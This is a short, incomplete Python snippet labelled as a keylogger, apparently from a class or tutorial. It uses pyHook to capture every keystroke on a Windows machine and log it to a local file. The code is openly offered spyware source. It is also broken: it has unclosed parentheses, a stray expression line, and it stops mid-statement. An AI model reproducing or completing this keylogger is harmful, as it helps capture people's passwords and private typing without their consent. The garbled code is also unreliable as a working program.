#python class
#Keyloagger 
#To interact with Windows, download the python module pywin32(goo.gl/DdKLg)
#Download PyHook module

import pyHook, pythoncom, sys, logging

file_log = 'C:\\important\\log.txt'

def OnKeyboardEvent(event):
	logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s'
	chr(event.Ascii)
	logging.log(10,chr(event.Ascii)
	return True

hooks_manager 